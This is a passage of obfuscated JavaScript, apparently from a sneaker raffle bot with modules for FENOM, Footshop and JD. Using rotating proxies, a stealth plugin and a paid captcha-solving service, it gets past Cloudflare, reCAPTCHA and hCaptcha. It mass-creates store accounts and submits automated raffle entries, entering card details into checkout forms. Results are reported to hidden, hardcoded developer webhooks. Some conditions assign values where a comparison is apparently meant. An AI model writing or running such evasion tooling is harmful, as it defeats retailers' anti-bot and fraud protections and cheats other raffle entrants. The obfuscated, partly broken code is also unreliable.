                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x508dba() + '\x20[' + _0x5c87cd['name'] + ']\x20Task\x20' + (_0xb0a4d7 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x41fcd1['type']('input[name=\x22firstname\x22]', '' + _0x26d6da[_0xb0a4d7]['FirstName']), await _0x54262e(0x1f4), await _0x41fcd1['type']('input[name=\x22lastname\x22]', '' + _0x26d6da[_0xb0a4d7]['LastName']), await _0x54262e(0x1f4), await _0x41fcd1['type']('input[name=\x22email\x22]', '' + _0x26d6da[_0xb0a4d7]['Email']), await _0x54262e(0x1f4), await _0x41fcd1['type']('input[name=\x22password\x22]', '' + _0x26d6da[_0xb0a4d7]['Password']), await _0x54262e(0x258), await _0x41fcd1['$eval']('input[name=\x22psgdpr\x22]', _0x4d0ebc => _0x4d0ebc['click']()), await _0x54262e(0x1f4), console['log'](_0x508dba() + '\x20[' + _0x5c87cd['name'] + ']\x20Task\x20' + (_0xb0a4d7 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x41fcd1['$eval']('#customer-form', _0xc8a835 => _0xc8a835['submit']());
                            try {
                                await _0x41fcd1['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x41119a = 'no', console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x5c87cd['name'] + ']\x20Task\x20' + (_0xb0a4d7 + 0x1) + '\x20:\x20Account\x20' + _0x26d6da[_0xb0a4d7]['Email'] + '\x20Generated')), _0x3a2baa['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x26d6da[_0xb0a4d7]['Email'] + ',' + _0x26d6da[_0xb0a4d7]['Password']);
                                try {
                                    _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x1d0dca['succesDEVMSG']);
                                } catch {
                                }
                                await _0x459a7f(_0x1796bc, _0x1d0dca['succesDEVMSG']);
                            } catch (_0x51af95) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0x51af95);
                            }
                        } catch (_0x39a997) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5c87cd['name'] + ']\x20Task\x20' + (_0xb0a4d7 + 0x1) + '\x20:\x20' + _0x39a997)), _0x2205fb = '' + _0x39a997;
                            var _0x5d5d02 = await _0x107feb(_0x26d6da[_0xb0a4d7], _0x5c87cd, 'acc', !![], _0x2205fb);
                            _0x1d0dca['errorDEV'] = { 'embeds': [_0x5d5d02] }, _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x1d0dca['errorDEV']), await _0x459a7f(_0x491127, _0x1d0dca['errorDEV']), _0x41119a = 'yes';
                        } finally {
                            _0x1bb2f1['close']();
                            if (_0x41119a == 'yes' && _0x335d67 != 0x5 && _0x2205fb != 'Size\x20Not\x20Found') {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5c87cd['name'] + ']\x20Task\x20' + (_0xb0a4d7 + 0x1) + '\x20:\x20Retrying')), _0xb0a4d7 = _0xb0a4d7 - 0x1, _0x335d67 = _0x335d67 + 0x1;
                                continue;
                            }
                            _0x41119a == 'yes' && _0x335d67 >= 0x5 && (_0x29ff38(_0x26d6da[_0xb0a4d7], _0x5c87cd), _0x41119a = 'no', _0x335d67 = 0x0), console['log'](_0x508dba() + '\x20[' + _0x5c87cd['name'] + ']\x20Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x3f685f(_0x2bcdf7, _0x457481, _0x16acbc) {
                    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x196f8e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x240ad8 = 0x0; _0x240ad8 < _0x457481['length']; _0x240ad8++) {
                        if (_0x6b48ae != 'yes')
                            var _0x6b48ae = '', _0x59e29b = 0x0;
                        var _0x2115c3;
                        await _0x2e3034(_0x457481, _0x240ad8), _0x3feae7(_0x2bcdf7['name'] + '\x20Task\x20' + (_0x240ad8 + 0x1) + '\x20/\x20' + _0x457481['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24);
                        const _0x158c66 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x5e28df = Math['round'](Math['random']() * (_0x16acbc['length'] - 0x1)), _0x14087e = _0x16acbc[_0x5e28df]['split'](':'), _0x2e3865;
                        try {
                            _0x2e3865 = await _0x3dd4ff['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x14087e[0x0] + ':' + _0x14087e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2e3865 = await _0x3dd4ff['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x14087e[0x0] + ':' + _0x14087e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x13e7fa = await _0x2e3865['newPage'](), _0x23a930 = await _0x13e7fa['target']()['createCDPSession'](), { windowId: _0x4b96b7 } = await _0x23a930['send']('Browser.getWindowForTarget');
                            await _0x13e7fa['authenticate']({
                                'username': '' + _0x14087e[0x2],
                                'password': '' + _0x14087e[0x3]
                            }), console['log'](_0x508dba() + '\x20[' + _0x2bcdf7['name'] + ']\x20Task\x20' + (_0x240ad8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x13e7fa['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x508dba() + '\x20[' + _0x2bcdf7['name'] + ']\x20Task\x20' + (_0x240ad8 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x54262e(0xbb8), await _0x23a930['send']('Browser.setWindowBounds', {
                                'windowId': _0x4b96b7,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x54262e(0x1f40);
                            try {
                                await _0x13e7fa['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x54262e(0x1388), console['log'](_0x508dba() + '\x20[' + _0x2bcdf7['name'] + ']\x20Task\x20' + (_0x240ad8 + 0x1) + '\x20:\x20Logging\x20in'), await _0x13e7fa['type']('input[name=\x22email\x22]', '' + _0x457481[_0x240ad8]['Email']), await _0x54262e(0x1f4), await _0x13e7fa['type']('input[name=\x22password\x22]', '' + _0x457481[_0x240ad8]['Password']), await _0x54262e(0x258), await _0x13e7fa['$eval']('#login-form', _0x3d05e7 => _0x3d05e7['submit']()), await _0x13e7fa['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x54262e(0x1f4), await _0x13e7fa['goto']('' + _0x457481[_0x240ad8]['Url']), await _0x13e7fa['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x508dba() + '\x20[' + _0x2bcdf7['name'] + ']\x20Task\x20' + (_0x240ad8 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x457481[_0x240ad8]['Size']);
                            if (_0x457481[_0x240ad8]['Size'] != 'RANDOM') {
                                var _0x381391 = '\x20' + _0x457481[_0x240ad8]['Size'] + '\x20';
                                const _0x14ee66 = await _0x13e7fa['$x']('//span[contains(text(),\x20' + _0x381391 + ')]');
                                await _0x14ee66[0x0]['click']();
                            } else {
                                const _0x298c8d = await _0x13e7fa['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x52d8d8 = Math['round'](Math['random']() * (_0x298c8d['length'] - 0x1));
                                await _0x298c8d[_0x52d8d8]['click']();
                            }
                            await _0x54262e(0x258), await _0x13e7fa['click']('#cookieChoiceDismiss'), await _0x54262e(0x3e8), await _0x13e7fa['type']('#instagram-account', '' + _0x457481[_0x240ad8]['Follower']), await _0x54262e(0x28a), await _0x13e7fa['click']('#book-btn'), await _0x54262e(0xbb8), await _0x13e7fa['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x54262e(0x1f4), console['log'](_0x508dba() + '\x20[' + _0x2bcdf7['name'] + ']\x20Task\x20' + (_0x240ad8 + 0x1) + '\x20:\x20' + _0x351e10['cyan']('Solving\x20Captcha')), await _0x13e7fa['solveRecaptchas'](), console['log'](_0x508dba() + '\x20[' + _0x2bcdf7['name'] + ']\x20Task\x20' + (_0x240ad8 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x54262e(0x7d0), await _0x13e7fa['$eval']('#book-btn-for-sure', _0x3b7cf3 => _0x3b7cf3['click']()), await _0x54262e(0x12c), await _0x13e7fa['click']('#book-btn-for-sure'), await _0x54262e(0xdac);
                            const _0x16989b = await _0x13e7fa['$eval']('.reservation-popup\x20>\x20.title', _0x3a3f9c => {
                                return _0x3a3f9c['innerHTML'];
                            });
                            if (_0x16989b) {
                                _0x6b48ae = 'no', _0x3444cf(_0x457481[_0x240ad8], _0x2bcdf7), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x2bcdf7['name'] + ']\x20Task\x20' + (_0x240ad8 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0xbeaae = await _0x107feb(_0x457481[_0x240ad8], _0x2bcdf7, 'dev', ![]), _0x46ee74 = await _0x107feb(_0x457481[_0x240ad8], _0x2bcdf7, 'pub', ![]);
                                const _0x565088 = {
                                    'succesDEVMSG': { 'embeds': [_0xbeaae] },
                                    'succesPUBMSG': { 'embeds': [_0x46ee74] }
                                };
                                try {
                                    _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x565088['succesDEVMSG']), await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x565088['succesDEVMSG']), await _0x54262e(0xc8), await _0x459a7f(_0xf106b7, _0x565088['succesPUBMSG']);
                                } catch (_0x50d1bb) {
                                    console['log'](_0x351e10['yellow'](_0x508dba() + '\x20[' + _0x2bcdf7['name'] + ']\x20Task\x20' + (_0x240ad8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x50d1bb));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x317e51) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x2bcdf7['name'] + ']\x20Task\x20' + (_0x240ad8 + 0x1) + '\x20:\x20' + _0x317e51)), _0x2115c3 = '' + _0x317e51;
                            var _0xa8a694 = await _0x107feb(_0x457481[_0x240ad8], _0x2bcdf7, 'dev', !![], _0x2115c3), _0xbeaae = await _0x107feb(_0x457481[_0x240ad8], _0x2bcdf7, 'dev', ![]), _0x46ee74 = await _0x107feb(_0x457481[_0x240ad8], _0x2bcdf7, 'pub', ![]);
                            const _0x5352ed = {
                                'succesDEVMSG': { 'embeds': [_0xbeaae] },
                                'succesPUBMSG': { 'embeds': [_0x46ee74] }
                            };
                            _0x5352ed['errorDEV'] = { 'embeds': [_0xa8a694] }, _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x5352ed['errorDEV']), await _0x459a7f(_0x491127, _0x5352ed['errorDEV']), _0x317e51 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x6b48ae = 'yes');
                        } finally {
                            _0x2e3865['close']();
                            if (_0x6b48ae == 'yes' && _0x59e29b != 0x5 && _0x2115c3 != 'Size\x20Not\x20Found') {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x2bcdf7['name'] + ']\x20Task\x20' + (_0x240ad8 + 0x1) + '\x20:\x20Retrying')), _0x240ad8 = _0x240ad8 - 0x1, _0x59e29b = _0x59e29b + 0x1;
                                continue;
                            }
                            _0x6b48ae == 'yes' && _0x59e29b >= 0x5 && (_0x29ff38(_0x457481[_0x240ad8], _0x2bcdf7), _0x6b48ae = 'no', _0x59e29b = 0x0), console['log'](_0x508dba() + '\x20[' + _0x2bcdf7['name'] + ']\x20Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x550f25, _0x503f84, _0x1ae2d2) {
                _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x196f8e['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x51580a = 0x0; _0x51580a < _0x503f84['length']; _0x51580a++) {
                    var _0x1bdc6b;
                    if (_0x1285f8 != 'yes')
                        var _0x1285f8 = '', _0x58402c = 0x0;
                    var _0x2078c7 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x2ccb52
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x503f84[_0x51580a]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x503f84[_0x51580a]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x196f8e['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5c71b0
                            }
                        ]
                    }], _0x3a18dd = await _0x107feb(_0x503f84[_0x51580a], _0x550f25, 'dev', ![]), _0x1ca75f = await _0x107feb(_0x503f84[_0x51580a], _0x550f25, 'pub', ![]);
                    const _0x120d6b = {
                        'succesDEVMSG': { 'embeds': [_0x3a18dd] },
                        'succesPUBMSG': { 'embeds': [_0x1ca75f] }
                    }, _0x22621f = { 'embeds': _0x2078c7 };
                    await _0x2e3034(_0x503f84, _0x51580a);
                    if (_0x503f84[_0x51580a]['Email'] == '' || _0x503f84[_0x51580a]['FirstName'] == '' || _0x503f84[_0x51580a]['LastName'] == '' || _0x503f84[_0x51580a]['Country'] == '' || _0x503f84[_0x51580a]['Size'] == '' || _0x503f84[_0x51580a]['Address1'] == '' || _0x503f84[_0x51580a]['Zip'] == '') {
                        console['log'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x503f84[_0x51580a]['Email'] == '' || _0x503f84[_0x51580a]['FirstName'] == '' || _0x503f84[_0x51580a]['LastName'] == '' || _0x503f84[_0x51580a]['Country'] == '' || _0x503f84[_0x51580a]['Size'] == '' || _0x503f84[_0x51580a]['Address1'] == '' || _0x503f84[_0x51580a]['Zip'] == '' || _0x503f84[_0x51580a]['Phone'] == '') {
                        console['log'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x46cb09 = '' + _0x503f84[_0x51580a]['Url'];
                    if (_0x196f8e['useRandomProxy'] = ![])
                        var _0x200552 = _0x1ae2d2[_0x51580a]['split'](':');
                    else
                        var _0x454935 = Math['round'](Math['random']() * (_0x1ae2d2['length'] - 0x1)), _0x200552 = _0x1ae2d2[_0x454935]['split'](':');
                    const _0x4f9cf4 = await _0x3dd4ff['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x200552[0x0] + ':' + _0x200552[0x1]]
                    });
                    try {
                        const _0x3b5e11 = await _0x4f9cf4['newPage']();
                        await _0x3b5e11['authenticate']({
                            'username': '' + _0x200552[0x2],
                            'password': '' + _0x200552[0x3]
                        }), console['log'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3b5e11['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3b5e11['setRequestInterception'](!![]), _0x3b5e11['on']('request', _0x1f6ccd => {
                            _0x1f6ccd['resourceType']() === 'image' || _0x1f6ccd['resourceType']() === 'font' || _0x1f6ccd['resourceType']() === 'media' ? _0x1f6ccd['abort']() : _0x1f6ccd['continue']();
                        }), await _0x3b5e11['goto'](_0x46cb09), await _0x54262e(0xbb8), await _0x3b5e11['waitForSelector']('.control__JhutY'), await _0x3b5e11['click']('.control__JhutY'), await _0x54262e(0x1f4);
                        if (_0x503f84[_0x51580a]['Size'] != 'RANDOM')
                            try {
                                const _0x2b8f22 = await _0x3b5e11['$x']('//div[contains(text(),\x20\x27' + _0x503f84[_0x51580a]['Size'] + '\x27)]');
                                await _0x2b8f22[0x0]['click']();
                            } catch {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x4c2208 = await _0x3b5e11['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x382d34 = Math['round'](Math['random']() * (_0x4c2208['length'] - 0x1));
                            await _0x4c2208[_0x382d34]['click']();
                        }
                        await _0x54262e(0x4b0);
                        const _0x286ed1 = await _0x3b5e11['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x286ed1[0x0]['click'](), await _0x3b5e11['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x3b5e11['type']('input[name=\x22email\x22]', '' + _0x503f84[_0x51580a]['Email']), await _0x54262e(0x640), await _0x3b5e11['type']('input[name=\x22phone\x22]', '' + _0x503f84[_0x51580a]['Phone']), await _0x54262e(0x4b0), await _0x3b5e11['click']('button.btn.continue-button__1RtsS'), await _0x54262e(0x4b0);
                        try {
                            await _0x3b5e11['type']('input[name=\x22firstName\x22]', '' + _0x503f84[_0x51580a]['FirstName']), await _0x54262e(0x258);
                        } catch {
                            const _0x2541ea = await _0x3b5e11['$$eval']('.invalid-feedback\x20>\x20div', _0x30fa5b => {
                                return _0x30fa5b['map'](_0x450e96 => _0x450e96['innerText']);
                            });
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20' + _0x2541ea));
                            continue;
                        }
                        await _0x3b5e11['type']('input[name=\x22lastName\x22]', '' + _0x503f84[_0x51580a]['LastName']), await _0x54262e(0xc8), await _0x3b5e11['type']('input[name=\x22instagramUsername\x22]', '' + _0x503f84[_0x51580a]['Follower']), await _0x54262e(0x4b0), await _0x3b5e11['click']('button.btn.continue-button__1RtsS'), await _0x54262e(0x3e8), console['log'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x3b5e11['select']('select[name=\x22country\x22]', '' + _0x503f84[_0x51580a]['Country']), await _0x54262e(0x2bc), await _0x3b5e11['type']('input[name=\x22streetName\x22]', '' + _0x503f84[_0x51580a]['Address1']), await _0x54262e(0x258), await _0x3b5e11['type']('input[name=\x22houseNumber\x22]', _0x503f84[_0x51580a]['HouseNumber'] + '\x20' + _0x503f84[_0x51580a]['Address2']), await _0x54262e(0xc8), await _0x3b5e11['type']('input[name=\x22postalCode\x22]', '' + _0x503f84[_0x51580a]['Zip']), await _0x54262e(0x1f4), await _0x3b5e11['type']('input[name=\x22city\x22]', '' + _0x503f84[_0x51580a]['City']), await _0x54262e(0x4b0), await _0x3b5e11['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x54262e(0x4b0), await _0x3b5e11['click']('button.btn.continue-button__1RtsS'), await _0x54262e(0x4b0), console['log'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x3b5e11['solveRecaptchas'](), console['log'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x54262e(0xbb8), await _0x3b5e11['click']('button.btn.continue-button__1RtsS'), await _0x54262e(0x1388), console['log'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x3b5e11['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3b5e11['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x54262e(0x4b0), await _0x3b5e11['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x503f84[_0x51580a]['CardNumber']), await _0x54262e(0x320), await _0x3b5e11['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3b5e11['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x503f84[_0x51580a]['ExpiryDate']), await _0x54262e(0x4b0), await _0x3b5e11['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3b5e11['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x503f84[_0x51580a]['CVV']), await _0x54262e(0x226), await _0x3b5e11['type']('input[name=\x22holderName\x22]', '' + _0x503f84[_0x51580a]['NameOnCard']), await _0x54262e(0x226), await _0x3b5e11['click']('button.adyen-checkout__button'), console['log'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x3b5e11['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x54262e(0xbb8);
                        } catch (_0x49f3e5) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x203DS\x20Failed')), _0x1bdc6b = '3DS\x20Error\x20' + _0x49f3e5;
                            var _0x1d1e62 = await _0x107feb(_0x503f84[_0x51580a], _0x550f25, 'dev', !![], _0x1bdc6b);
                            _0x120d6b['errorDEV'] = { 'embeds': [_0x1d1e62] };
                            _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x120d6b['errorDEV']);
                            await _0x459a7f(_0x491127, _0x120d6b['errorDEV']);
                            continue;
                        }
                        _0x3444cf(_0x503f84[_0x51580a], _0x550f25), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '')
                            try {
                                await _0x459a7f(_0x196f8e['webhook'], _0x120d6b['succesDEVMSG']);
                            } catch {
                            }
                        await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x120d6b['succesDEVMSG']), await _0x54262e(0xc8);
                        try {
                            await _0x459a7f(_0xf106b7, _0x120d6b['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x5ad96c) {
                        console['log'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20' + _0x5ad96c), _0x1bdc6b = '' + _0x5ad96c;
                        var _0x1d1e62 = await _0x107feb(_0x503f84[_0x51580a], _0x550f25, 'dev', !![], _0x1bdc6b);
                        _0x120d6b['errorDEV'] = { 'embeds': [_0x1d1e62] }, _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x120d6b['errorDEV']), await _0x459a7f(_0x491127, _0x120d6b['errorDEV']), _0x1285f8 = 'yes';
                    } finally {
                        _0x4f9cf4['close']();
                        if (_0x1285f8 == 'yes' && _0x58402c != 0x5) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x550f25['name'] + ']\x20Task\x20' + (_0x51580a + 0x1) + '\x20:\x20Retrying')), _0x51580a = _0x51580a - 0x1, _0x58402c = _0x58402c + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x196f8e['footshopDelay'] + '\x20ms'), await _0x54262e(_0x196f8e['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x5c6b7e, _0x348d3e, _0x4b7a0b) {
                var _0x23c87a = ![], _0x7c017b = ![];
                if (_0x196f8e['captchaKey'] == '' || _0x196f8e['captchaKey'] == undefined)
                    return console['log'](_0x351e10['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x196f8e['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0xc95293 = 0x0; _0xc95293 < _0x348d3e['length']; _0xc95293++) {
                    if (_0x5b2f6d != 'yes')
                        var _0x5b2f6d = '', _0x5bfe71 = 0x0;
                    var _0x20995f, _0x17eddb = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x348d3e[_0xc95293]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x348d3e[_0xc95293]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x2ccb52
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x196f8e['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5c71b0
                            }
                        ]
                    }];
                    const _0x5512ef = { 'embeds': _0x17eddb };
                    _0x3feae7(_0x5c6b7e['name'] + '\x20Task\x20' + (_0xc95293 + 0x1) + '\x20/\x20' + _0x348d3e['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24), await _0x2e3034(_0x348d3e, _0xc95293);
                    var _0x8fc0ce = await _0x107feb(_0x348d3e[_0xc95293], _0x5c6b7e, 'dev', ![]), _0x3bf230 = await _0x107feb(_0x348d3e[_0xc95293], _0x5c6b7e, 'pub', ![]);
                    const _0x5b74f9 = {
                        'succesDEVMSG': { 'embeds': [_0x8fc0ce] },
                        'succesPUBMSG': { 'embeds': [_0x3bf230] }
                    };
                    if (_0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '')
                        try {
                            await _0x459a7f(_0x196f8e['webhook'], _0x5b74f9['succesDEVMSG']);
                        } catch {
                        }
                    await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x5b74f9['succesDEVMSG']), await _0x54262e(0xc8);
                    try {
                        await _0x459a7f(_0xf106b7, _0x5b74f9['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x348d3e[_0xc95293]['Email'] == '' || _0x348d3e[_0xc95293]['Url'] == '' || _0x348d3e[_0xc95293]['FirstName'] == '' || _0x348d3e[_0xc95293]['LastName'] == '') {
                        console['log'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0xc95293 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x196f8e['useRandomProxy'] = ![])
                        var _0x299231 = _0x4b7a0b[_0xc95293]['split'](':');
                    else
                        var _0x266896 = Math['round'](Math['random']() * (_0x4b7a0b['length'] - 0x1)), _0x299231 = _0x4b7a0b[_0x266896]['split'](':');
                    const _0x79c36f = await _0x3dd4ff['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x299231[0x0] + ':' + _0x299231[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x28516f = await _0x79c36f['newPage']();
                        await _0x28516f['authenticate']({
                            'username': '' + _0x299231[0x2],
                            'password': '' + _0x299231[0x3]
                        }), console['log'](_0x508dba() + '\x20[' + _0x5c6b7e['name'] + ']\x20Task\x20' + (_0xc95293 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x28516f['setRequestInterception'](!![]), _0x28516f['on']('request', _0x14aca3 => {
                            _0x14aca3['resourceType']() === 'image' || _0x14aca3['resourceType']() === 'font' || _0x14aca3['resourceType']() === 'media' ? _0x14aca3['abort']() : _0x14aca3['continue']();
                        }), await _0x28516f['goto']('' + _0x348d3e[_0xc95293]['Url'], {
                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x28516f['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
